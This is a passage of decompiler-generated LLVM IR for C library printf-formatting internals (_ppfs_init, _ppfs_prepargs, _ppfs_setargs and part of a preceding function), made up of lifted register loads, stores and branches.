  store i32 %v1_804ea0d, i32* %eax.global-to-local, align 4
  %v2_804ea14 = add i32 %v0_804ea04, -12
  %v3_804ea14 = inttoptr i32 %v2_804ea14 to i32*
  store i32 %v1_804ea0d, i32* %v3_804ea14, align 4
  %v1_804ea15 = add i32 %v0_804ea04, 204
  store i32 %v1_804ea15, i32* @edi, align 4
  %v2_804ea1c = add i32 %v0_804ea04, -16
  %v3_804ea1c = inttoptr i32 %v2_804ea1c to i32*
  store i32 %v1_804ea15, i32* %v3_804ea1c, align 4
  %v0_804ea1d = call i32 @__GI_wcsrtombs()
  store i32 %v0_804ea1d, i32* @ebx, align 4
  %v0_804ea24 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804ea29 = icmp eq i32 %v0_804ea1d, 0
  br i1 %v1_804ea29, label %dec_label_pc_804ea3f, label %dec_label_pc_804ea2d

dec_label_pc_804ea2d:                             ; preds = %dec_label_pc_804ea04
  %v0_804ea2d = load i32, i32* @ebp, align 4
  %v2_804ea2d = add i32 %v0_804ea24, 12
  %v3_804ea2d = inttoptr i32 %v2_804ea2d to i32*
  store i32 %v0_804ea2d, i32* %v3_804ea2d, align 4
  %v1_804ea2e = add i32 %v0_804ea24, 384
  %v2_804ea2e = inttoptr i32 %v1_804ea2e to i32*
  %v3_804ea2e = load i32, i32* %v2_804ea2e, align 4
  %v5_804ea2e = add i32 %v0_804ea24, 8
  %v6_804ea2e = inttoptr i32 %v5_804ea2e to i32*
  store i32 %v3_804ea2e, i32* %v6_804ea2e, align 4
  %v2_804ea35 = add i32 %v0_804ea24, 4
  %v3_804ea35 = inttoptr i32 %v2_804ea35 to i32*
  store i32 %v0_804ea1d, i32* %v3_804ea35, align 4
  %v0_804ea36 = load i32, i32* @edi, align 4
  %v3_804ea36 = inttoptr i32 %v0_804ea24 to i32*
  store i32 %v0_804ea36, i32* %v3_804ea36, align 4
  %v0_804ea37 = load i32, i32* %stack_var_-364, align 4
  %v4_804ea37 = call i32 @__stdio_fwrite(i32 %v0_804ea37, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ea37, i32* %eax.global-to-local, align 4
  %v0_804ea3c = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ea3f

dec_label_pc_804ea3f:                             ; preds = %dec_label_pc_804ea04, %dec_label_pc_804ea2d
  %v0_804ea7750.in = phi i32 [ %v0_804ea24, %dec_label_pc_804ea04 ], [ %v0_804ea3c, %dec_label_pc_804ea2d ]
  %v1_804ea43 = phi i32 [ 0, %dec_label_pc_804ea04 ], [ %v4_804ea37, %dec_label_pc_804ea2d ]
  %v0_804ea7750 = add i32 %v0_804ea7750.in, 16
  %v12_804ea3f = icmp eq i32 %v1_804ea43, %v0_804ea1d
  %v1_804ea41 = icmp eq i1 %v12_804ea3f, false
  br i1 %v1_804ea41, label %dec_label_pc_804ea77, label %dec_label_pc_804ea43

dec_label_pc_804ea43:                             ; preds = %dec_label_pc_804ea3f
  %v0_804ea43 = load i32, i32* @esi, align 4
  %v2_804ea43 = sub i32 %v0_804ea43, %v1_804ea43
  %v12_804ea43 = icmp eq i32 %v2_804ea43, 0
  store i32 %v2_804ea43, i32* @esi, align 4
  %v1_804ea47 = icmp eq i1 %v12_804ea43, false
  br i1 %v1_804ea47, label %dec_label_pc_804e9f5, label %dec_label_pc_804ea49

dec_label_pc_804ea49:                             ; preds = %dec_label_pc_804ea43, %dec_label_pc_804e9de.thread, %dec_label_pc_804e9e8.dec_label_pc_804ea49.loopexit_crit_edge, %dec_label_pc_804e9de
  %v0_804ea49 = phi i32 [ %v1_804e9db, %dec_label_pc_804e9de ], [ %v0_804ea49.pre.pre, %dec_label_pc_804e9e8.dec_label_pc_804ea49.loopexit_crit_edge ], [ %v1_804e9b1, %dec_label_pc_804e9de.thread ], [ %v0_804ea7750, %dec_label_pc_804ea43 ]
  %v1_804ea49 = add i32 %v0_804ea49, 8
  %v2_804ea49 = inttoptr i32 %v1_804ea49 to i32*
  %v3_804ea49 = load i32, i32* %v2_804ea49, align 4
  store i32 %v3_804ea49, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804ea52 = add i32 %v0_804ea49, 368
  %v2_804ea52 = inttoptr i32 %v1_804ea52 to i32*
  %v3_804ea52 = load i32, i32* %v2_804ea52, align 4
  store i32 %v3_804ea52, i32* @eax, align 4
  %v0_804ea59 = call i32 @_charpad()
  store i32 %v0_804ea59, i32* %eax.global-to-local, align 4
  %v1_804ea5e = load i32, i32* @esp, align 4
  %v2_804ea5e = add i32 %v1_804ea5e, 8
  %v3_804ea5e = inttoptr i32 %v2_804ea5e to i32*
  %v4_804ea5e = load i32, i32* %v3_804ea5e, align 4
  %v15_804ea5e = icmp eq i32 %v0_804ea59, %v4_804ea5e
  %v1_804ea62 = icmp eq i1 %v15_804ea5e, false
  br i1 %v1_804ea62, label %dec_label_pc_804ea77, label %dec_label_pc_804ea64

dec_label_pc_804ea64:                             ; preds = %dec_label_pc_804ea49, %dec_label_pc_804e7de, %dec_label_pc_804e60c
  %v0_804ea64 = phi i32 [ %v1_804ea5e, %dec_label_pc_804ea49 ], [ %v0_804ea64.pre, %dec_label_pc_804e7de ], [ %v1_804e62a, %dec_label_pc_804e60c ]
  %v1_804ea64 = add i32 %v0_804ea64, 16
  %v2_804ea64 = inttoptr i32 %v1_804ea64 to i32*
  %v3_804ea64 = load i32, i32* %v2_804ea64, align 4
  store i32 %v3_804ea64, i32* @ebx, align 4
  store i32 %v3_804ea64, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e564.backedge

dec_label_pc_804ea6f:                             ; preds = %dec_label_pc_804e5a2
  %v1_804ea6f = add i32 %v0_804ea6f, 2
  store i32 %v1_804ea6f, i32* @ebx, align 4
  br label %dec_label_pc_804e564.backedge

dec_label_pc_804ea77:                             ; preds = %dec_label_pc_804e58e, %dec_label_pc_804ea49, %dec_label_pc_804e9de, %dec_label_pc_804e989, %dec_label_pc_804e962, %dec_label_pc_804e8d2, %dec_label_pc_804e84d, %dec_label_pc_804e821, %dec_label_pc_804e7b5, %dec_label_pc_804ea3f
  %v0_804ea77 = phi i32 [ %v0_804ea7750, %dec_label_pc_804ea3f ], [ %v0_804ea77.pre.pre, %dec_label_pc_804e58e ], [ %v1_804ea5e, %dec_label_pc_804ea49 ], [ %v1_804e9db, %dec_label_pc_804e9de ], [ %v1_804e9b1, %dec_label_pc_804e989 ], [ %v1_804e977, %dec_label_pc_804e962 ], [ %v0_804e604.lcssa, %dec_label_pc_804e8d2 ], [ %v1_804e865, %dec_label_pc_804e84d ], [ %v1_804e838, %dec_label_pc_804e821 ], [ %v1_804e7d3, %dec_label_pc_804e7b5 ]
  %v1_804ea77 = inttoptr i32 %v0_804ea77 to i32*
  store i32 -1, i32* %v1_804ea77, align 4
  br label %dec_label_pc_804ea7e

dec_label_pc_804ea7e:                             ; preds = %dec_label_pc_804e599, %dec_label_pc_804e507, %dec_label_pc_804e526, %dec_label_pc_804ea77
  %v0_804ea7e = load i32, i32* @esp, align 4
  %v1_804ea7e = inttoptr i32 %v0_804ea7e to i32*
  %v2_804ea7e = load i32, i32* %v1_804ea7e, align 4
  store i32 %v2_804ea7e, i32* %eax.global-to-local, align 4
  ret i32 %v2_804ea7e

; uselistorder directives
  uselistorder i32 %v1_804ea6f, { 1, 0 }
  uselistorder i32 %v3_804ea64, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804ea49, { 1, 0 }
  uselistorder i32 %v2_804ea43, { 1, 2, 0 }
  uselistorder i32 %v0_804ea7750, { 1, 0 }
  uselistorder i32 %v1_804ea43, { 1, 0 }
  uselistorder i32 %v0_804ea24, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_804e9b1, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804e989, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804e962, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804e936, { 1, 0, 2 }
  uselistorder i32 %v6_804e923, { 1, 0 }
  uselistorder i32 %v1_804e920, { 1, 0 }
  uselistorder i32 %v0_804e919, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804e8a3, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_804e8b3, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804e814, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_804e7fa, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_804e793, { 1, 0, 2 }
  uselistorder i32 %v1_804e717, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_804e76a, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_804e6f3, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804e6ac, { 1, 0 }
  uselistorder i32 %v1_804e6b9, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_804e604, { 3, 10, 11, 5, 4, 7, 6, 8, 12, 0, 1, 2, 13, 9, 14, 15 }
  uselistorder i32 %v0_804e604.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804e600, { 1, 0 }
  uselistorder i32 %v1_804e600.pre, { 1, 0 }
  uselistorder i32 %v1_804e5ff, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_804e5fc, { 1, 0 }
  uselistorder i32 %v2_804e60081, { 1, 0 }
  uselistorder i32 %v3_804e5e6, { 1, 0 }
  uselistorder i32 %v1_804e5a2, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804e56e, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804e572, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804e55c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 2, 3, 4, 5, 0, 7, 6, 1, 8, 9, 10 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 25, 5, 1, 6, 10, 7, 8, 9, 11, 12, 13, 14, 16, 15, 18, 17, 19, 20, 26, 21, 22, 23, 27, 24, 28, 29, 30, 31 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 0, 1, 3, 2, 4, 5, 6, 10, 9, 8, 7, 11, 12, 13, 14 }
  uselistorder i32 204, { 2, 0, 3, 1, 4 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804ea7e, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804ea77, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804ea49, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804ea3f, { 1, 0 }
  uselistorder label %dec_label_pc_804ea04, { 1, 0 }
  uselistorder label %dec_label_pc_804e9f5, { 1, 0 }
  uselistorder label %dec_label_pc_804e989, { 1, 0 }
  uselistorder label %dec_label_pc_804e95b, { 1, 0 }
  uselistorder label %dec_label_pc_804e940, { 1, 0 }
  uselistorder label %dec_label_pc_804e92a, { 1, 0 }
  uselistorder label %dec_label_pc_804e916, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e90a, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804e8a3, { 1, 0 }
  uselistorder label %dec_label_pc_804e896, { 1, 0 }
  uselistorder label %dec_label_pc_804e821, { 1, 0 }
  uselistorder label %dec_label_pc_804e7b5, { 1, 0 }
  uselistorder label %dec_label_pc_804e76a, { 1, 0 }
  uselistorder label %dec_label_pc_804e75b, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_804e721, { 1, 0 }
  uselistorder label %dec_label_pc_804e708, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804e6b9, { 1, 0 }
  uselistorder label %dec_label_pc_804e6a0, { 1, 0 }
  uselistorder label %dec_label_pc_804e68c, { 1, 0 }
  uselistorder label %dec_label_pc_804e687, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e668, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e5f5, { 1, 0 }
  uselistorder label %dec_label_pc_804e5ed, { 1, 0 }
  uselistorder label %dec_label_pc_804e599, { 1, 0 }
  uselistorder label %dec_label_pc_804e58e, { 1, 0 }
  uselistorder label %dec_label_pc_804e564.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ea8c = load i32, i32* @esi, align 4
  %v0_804ea8d = load i32, i32* @ebx, align 4
  store i32 %v0_804ea8d, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804eaa1 = bitcast i32* %arg1 to i8*
  %v4_804eaa1 = call i32 @__GI_memset(i8* %v3_804eaa1, i32 0, i32 188)
  store i32 %v4_804eaa1, i32* %eax.global-to-local, align 4
  %v0_804eaa6 = load i32, i32* @ebx, align 4
  %v1_804eaa6 = add i32 %v0_804eaa6, 24
  %v2_804eaa6 = inttoptr i32 %v1_804eaa6 to i32*
  %v3_804eaa6 = load i32, i32* %v2_804eaa6, align 4
  %v4_804eaa6 = add i32 %v3_804eaa6, -1
  store i32 %v4_804eaa6, i32* %v2_804eaa6, align 4
  %v0_804eaa9 = load i32, i32* @esi, align 4
  %v1_804eaa9 = load i32, i32* @ebx, align 4
  %v2_804eaa9 = inttoptr i32 %v1_804eaa9 to i32*
  store i32 %v0_804eaa9, i32* %v2_804eaa9, align 4
  %v0_804eaab = load i32, i32* @ebx, align 4
  %v1_804eaab = add i32 %v0_804eaab, 40
  store i32 %v1_804eaab, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804eab6

dec_label_pc_804eab6:                             ; preds = %dec_label_pc_804eab6, %entry
  %v0_804eab6 = phi i32 [ %v1_804eabc, %dec_label_pc_804eab6 ], [ %v1_804eaab, %entry ]
  %v1_804eab6 = inttoptr i32 %v0_804eab6 to i32*
  store i32 8, i32* %v1_804eab6, align 4
  %v0_804eabc = load i32, i32* %eax.global-to-local, align 4
  %v1_804eabc = add i32 %v0_804eabc, 4
  store i32 %v1_804eabc, i32* %eax.global-to-local, align 4
  %v0_804eabf = load i32, i32* %edx.global-to-local, align 4
  %v1_804eabf = add i32 %v0_804eabf, -1
  %v8_804eabf = icmp eq i32 %v1_804eabf, 0
  store i32 %v1_804eabf, i32* %edx.global-to-local, align 4
  %v1_804eac0 = icmp eq i1 %v8_804eabf, false
  br i1 %v1_804eac0, label %dec_label_pc_804eab6, label %dec_label_pc_804eac2

dec_label_pc_804eac2:                             ; preds = %dec_label_pc_804eab6
  %v0_804eac2 = load i32, i32* @esi, align 4
  store i32 %v0_804eac2, i32* %eax.global-to-local, align 4
  %v1_804eaed20 = inttoptr i32 %v0_804eac2 to i8*
  %v2_804eaed21 = load i8, i8* %v1_804eaed20, align 1
  %v3_804eaed22 = zext i8 %v2_804eaed21 to i32
  %v5_804eaed23 = and i32 %v1_804eabf, -256
  %v6_804eaed24 = or i32 %v3_804eaed22, %v5_804eaed23
  store i32 %v6_804eaed24, i32* %edx.global-to-local, align 4
  %v4_804eaef25 = icmp eq i8 %v2_804eaed21, 0
  %v1_804eaf126 = icmp eq i1 %v4_804eaef25, false
  br i1 %v1_804eaf126, label %dec_label_pc_804eacb, label %dec_label_pc_804eaf3

dec_label_pc_804eacb:                             ; preds = %dec_label_pc_804eac2, %dec_label_pc_804eaed.backedge
  %v6_804eaed29 = phi i32 [ %v6_804eaed, %dec_label_pc_804eaed.backedge ], [ %v6_804eaed24, %dec_label_pc_804eac2 ]
  %v2_804eaed28 = phi i8 [ %v2_804eaed, %dec_label_pc_804eaed.backedge ], [ %v2_804eaed21, %dec_label_pc_804eac2 ]
  %v0_804ead027 = phi i32 [ %v0_804ead0.be, %dec_label_pc_804eaed.backedge ], [ %v0_804eac2, %dec_label_pc_804eac2 ]
  %v10_804eacb = icmp eq i8 %v2_804eaed28, 37
  %v1_804eace = icmp eq i1 %v10_804eacb, false
  br i1 %v1_804eace, label %dec_label_pc_804eaec, label %dec_label_pc_804ead0

dec_label_pc_804ead0:                             ; preds = %dec_label_pc_804eacb
  %v1_804ead0 = add i32 %v0_804ead027, 1
  store i32 %v1_804ead0, i32* %eax.global-to-local, align 4
  %v1_804ead1 = inttoptr i32 %v1_804ead0 to i8*
  %v2_804ead1 = load i8, i8* %v1_804ead1, align 1
  %v11_804ead1 = icmp eq i8 %v2_804ead1, 37
  br i1 %v11_804ead1, label %dec_label_pc_804eaec, label %dec_label_pc_804ead6

dec_label_pc_804ead6:                             ; preds = %dec_label_pc_804ead0
  %v1_804ead9 = load i32, i32* @ebx, align 4
  %v2_804ead9 = inttoptr i32 %v1_804ead9 to i32*
  store i32 %v1_804ead0, i32* %v2_804ead9, align 4
  %v0_804eadb = load i32, i32* @ebx, align 4
  %v1_804eadc = inttoptr i32 %v0_804eadb to i32*
  %v2_804eadc = call i32 @_ppfs_parsespec(i32* %v1_804eadc)
  store i32 %v2_804eadc, i32* %eax.global-to-local, align 4
  %v2_804eae4 = icmp slt i32 %v2_804eadc, 0
  br i1 %v2_804eae4, label %dec_label_pc_804eaf7, label %dec_label_pc_804eae8

dec_label_pc_804eae8:                             ; preds = %dec_label_pc_804ead6
  %v0_804eae8 = load i32, i32* @ebx, align 4
  %v1_804eae8 = inttoptr i32 %v0_804eae8 to i32*
  %v2_804eae8 = load i32, i32* %v1_804eae8, align 4
  %v4_804eaed.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804eaed.backedge

dec_label_pc_804eaec:                             ; preds = %dec_label_pc_804ead0, %dec_label_pc_804eacb
  %v0_804eaec = phi i32 [ %v1_804ead0, %dec_label_pc_804ead0 ], [ %v0_804ead027, %dec_label_pc_804eacb ]
  %v1_804eaec = add i32 %v0_804eaec, 1
  br label %dec_label_pc_804eaed.backedge

dec_label_pc_804eaed.backedge:                    ; preds = %dec_label_pc_804eaec, %dec_label_pc_804eae8
  %v4_804eaed.be = phi i32 [ %v4_804eaed.pre.pre, %dec_label_pc_804eae8 ], [ %v6_804eaed29, %dec_label_pc_804eaec ]
  %v0_804ead0.be = phi i32 [ %v2_804eae8, %dec_label_pc_804eae8 ], [ %v1_804eaec, %dec_label_pc_804eaec ]
  store i32 %v0_804ead0.be, i32* %eax.global-to-local, align 4
  %v1_804eaed = inttoptr i32 %v0_804ead0.be to i8*
  %v2_804eaed = load i8, i8* %v1_804eaed, align 1
  %v3_804eaed = zext i8 %v2_804eaed to i32
  %v5_804eaed = and i32 %v4_804eaed.be, -256
  %v6_804eaed = or i32 %v3_804eaed, %v5_804eaed
  store i32 %v6_804eaed, i32* %edx.global-to-local, align 4
  %v4_804eaef = icmp eq i8 %v2_804eaed, 0
  %v1_804eaf1 = icmp eq i1 %v4_804eaef, false
  br i1 %v1_804eaf1, label %dec_label_pc_804eacb, label %dec_label_pc_804eaed.dec_label_pc_804eaf3_crit_edge

dec_label_pc_804eaed.dec_label_pc_804eaf3_crit_edge: ; preds = %dec_label_pc_804eaed.backedge
  %v0_804eaf3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804eaf3

dec_label_pc_804eaf3:                             ; preds = %dec_label_pc_804eaed.dec_label_pc_804eaf3_crit_edge, %dec_label_pc_804eac2
  %v0_804eaf3 = phi i32 [ %v0_804eaf3.pre, %dec_label_pc_804eaed.dec_label_pc_804eaf3_crit_edge ], [ %v0_804eac2, %dec_label_pc_804eac2 ]
  %v1_804eaf3 = load i32, i32* @ebx, align 4
  %v2_804eaf3 = inttoptr i32 %v1_804eaf3 to i32*
  store i32 %v0_804eaf3, i32* %v2_804eaf3, align 4
  br label %dec_label_pc_804eaf7

dec_label_pc_804eaf7:                             ; preds = %dec_label_pc_804ead6, %dec_label_pc_804eaf3
  %storemerge = phi i32 [ 0, %dec_label_pc_804eaf3 ], [ -1, %dec_label_pc_804ead6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804eaf7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804eaf7, i32* @edx, align 4
  %v2_804eaf8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804eaf8, i32* @ebx, align 4
  store i32 %v0_804ea8c, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804eaed, { 1, 0 }
  uselistorder i8 %v2_804eaed, { 1, 2, 0 }
  uselistorder i32 %v0_804ead0.be, { 2, 1, 0 }
  uselistorder i32 %v0_804ead027, { 1, 0 }
  uselistorder i32 %v0_804eac2, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804eabf, { 0, 2, 1 }
  uselistorder i32 %v1_804eabc, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_804eaf7, { 1, 0 }
  uselistorder label %dec_label_pc_804eacb, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804eafc = load i32, i32* @esi, align 4
  %v0_804eafd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804eb09 = add i32 %arg1, 24
  %v2_804eb09 = inttoptr i32 %v1_804eb09 to i32*
  %v3_804eb09 = load i32, i32* %v2_804eb09, align 4
  %v2_804eb0c = add i32 %arg1, 76
  %v3_804eb0c = inttoptr i32 %v2_804eb0c to i32*
  store i32 %arg2, i32* %v3_804eb0c, align 4
  %tmp8 = icmp slt i32 %v3_804eb09, 1
  br i1 %tmp8, label %dec_label_pc_804eb3a, label %dec_label_pc_804eb13

dec_label_pc_804eb13:                             ; preds = %entry
  %v1_804eb16 = load i32, i32* @ebx, align 4
  %v2_804eb16 = add i32 %v1_804eb16, 28
  %v3_804eb16 = inttoptr i32 %v2_804eb16 to i32*
  store i32 %v3_804eb09, i32* %v3_804eb16, align 4
  %v0_804eb19 = load i32, i32* @ebx, align 4
  %v1_804eb19 = add i32 %v0_804eb19, 24
  %v2_804eb19 = inttoptr i32 %v1_804eb19 to i32*
  store i32 0, i32* %v2_804eb19, align 4
  %v0_804eb20 = load i32, i32* @ebx, align 4
  %v1_804eb20 = add i32 %v0_804eb20, 4
  %v2_804eb20 = inttoptr i32 %v1_804eb20 to i32*
  store i32 0, i32* %v2_804eb20, align 4
  %v0_804eb27 = load i32, i32* @ebx, align 4
  %v1_804eb27 = add i32 %v0_804eb27, 8
  %v2_804eb27 = inttoptr i32 %v1_804eb27 to i32*
  store i32 0, i32* %v2_804eb27, align 4
  %v0_804eb2e = load i32, i32* @ebx, align 4
  %v1_804eb2f = call i32 @_ppfs_setargs(i32 %v0_804eb2e)
  %v1_804eb34 = load i32, i32* @ebx, align 4
  %v2_804eb34 = add i32 %v1_804eb34, 24
  %v3_804eb34 = inttoptr i32 %v2_804eb34 to i32*
  store i32 %v3_804eb09, i32* %v3_804eb34, align 4
  br label %dec_label_pc_804eb3a

dec_label_pc_804eb3a:                             ; preds = %entry, %dec_label_pc_804eb13
  %v2_804eb3a = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804eafd, i32* @ebx, align 4
  store i32 %v0_804eafc, i32* @esi, align 4
  ret i32 %v2_804eb3a

; uselistorder directives
  uselistorder i32 %v3_804eb09, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804eb3a, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804eb41 = load i32, i32* @ebx, align 4
  store i32 %v0_804eb41, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804eb46 = add i32 %arg1, 80
  store i32 %v1_804eb46, i32* %ebx.global-to-local, align 4
  %v1_804eb49 = add i32 %arg1, 24
  %v2_804eb49 = inttoptr i32 %v1_804eb49 to i32*
  %v3_804eb49 = load i32, i32* %v2_804eb49, align 4
  %v4_804eb49 = icmp eq i32 %v3_804eb49, 0
  %v1_804eb4d = icmp eq i1 %v4_804eb49, false
  %v1_804ec03 = add i32 %arg1, 8
  %v2_804ec03 = inttoptr i32 %v1_804ec03 to i32*
  %v3_804ec03 = load i32, i32* %v2_804ec03, align 4
  %v8_804ec03 = icmp eq i32 %v3_804ec03, -2147483648
  %v1_804ec0a = icmp eq i1 %v8_804ec03, false
  br i1 %v1_804eb4d, label %dec_label_pc_804ec03, label %dec_label_pc_804eb53

dec_label_pc_804eb53:                             ; preds = %entry
  br i1 %v1_804ec0a, label %dec_label_pc_804eb6d, label %dec_label_pc_804eb5c

dec_label_pc_804eb5c:                             ; preds = %dec_label_pc_804eb53
  %v1_804eb5c = add i32 %arg1, 76
  %v2_804eb5c = inttoptr i32 %v1_804eb5c to i32*
  %v3_804eb5c = load i32, i32* %v2_804eb5c, align 4
  store i32 %v3_804eb5c, i32* %eax.global-to-local, align 4
  %v1_804eb5f = add i32 %v3_804eb5c, 4
  store i32 %v1_804eb5f, i32* %edx.global-to-local, align 4
  store i32 %v1_804eb5f, i32* %v2_804eb5c, align 4
  %v0_804eb65 = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb65 = inttoptr i32 %v0_804eb65 to i32*
  %v2_804eb65 = load i32, i32* %v1_804eb65, align 4
  store i32 %v2_804eb65, i32* %eax.global-to-local, align 4
  %v1_804eb67 = load i32, i32* @ecx, align 4
  %v2_804eb67 = add i32 %v1_804eb67, 80
  %v3_804eb67 = inttoptr i32 %v2_804eb67 to i32*
  store i32 %v2_804eb65, i32* %v3_804eb67, align 4
  %v0_804eb6a = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb6a = load i32, i32* @ecx, align 4
  %v2_804eb6a = add i32 %v1_804eb6a, 8
  %v3_804eb6a = inttoptr i32 %v2_804eb6a to i32*
  store i32 %v0_804eb6a, i32* %v3_804eb6a, align 4
  %v0_804eb6d.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804eb6d

dec_label_pc_804eb6d:                             ; preds = %dec_label_pc_804eb53, %dec_label_pc_804eb5c
  %v1_804eb7c = phi i32 [ %arg1, %dec_label_pc_804eb53 ], [ %v0_804eb6d.pre, %dec_label_pc_804eb5c ]
  %v1_804eb6d = add i32 %v1_804eb7c, 4
  %v2_804eb6d = inttoptr i32 %v1_804eb6d to i32*
  %v3_804eb6d = load i32, i32* %v2_804eb6d, align 4
  %v8_804eb6d = icmp eq i32 %v3_804eb6d, -2147483648
  %v1_804eb74 = icmp eq i1 %v8_804eb6d, false
  br i1 %v1_804eb74, label %dec_label_pc_804eb87, label %dec_label_pc_804eb76

dec_label_pc_804eb76:                             ; preds = %dec_label_pc_804eb6d
  %v1_804eb76 = add i32 %v1_804eb7c, 76
  %v2_804eb76 = inttoptr i32 %v1_804eb76 to i32*
  %v3_804eb76 = load i32, i32* %v2_804eb76, align 4
  store i32 %v3_804eb76, i32* %eax.global-to-local, align 4
  %v1_804eb79 = add i32 %v3_804eb76, 4
  store i32 %v1_804eb79, i32* %edx.global-to-local, align 4
  store i32 %v1_804eb79, i32* %v2_804eb76, align 4
  %v0_804eb7f = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb7f = inttoptr i32 %v0_804eb7f to i32*
  %v2_804eb7f = load i32, i32* %v1_804eb7f, align 4
  store i32 %v2_804eb7f, i32* %eax.global-to-local, align 4
  %v1_804eb81 = load i32, i32* @ecx, align 4
  %v2_804eb81 = add i32 %v1_804eb81, 80
  %v3_804eb81 = inttoptr i32 %v2_804eb81 to i32*
  store i32 %v2_804eb7f, i32* %v3_804eb81, align 4
  %v0_804eb84 = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb84 = load i32, i32* @ecx, align 4
  %v2_804eb84 = add i32 %v1_804eb84, 4
  %v3_804eb84 = inttoptr i32 %v2_804eb84 to i32*
  store i32 %v0_804eb84, i32* %v3_804eb84, align 4
  %v1_804ebfc17.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804eb87

dec_label_pc_804eb87:                             ; preds = %dec_label_pc_804eb6d, %dec_label_pc_804eb76
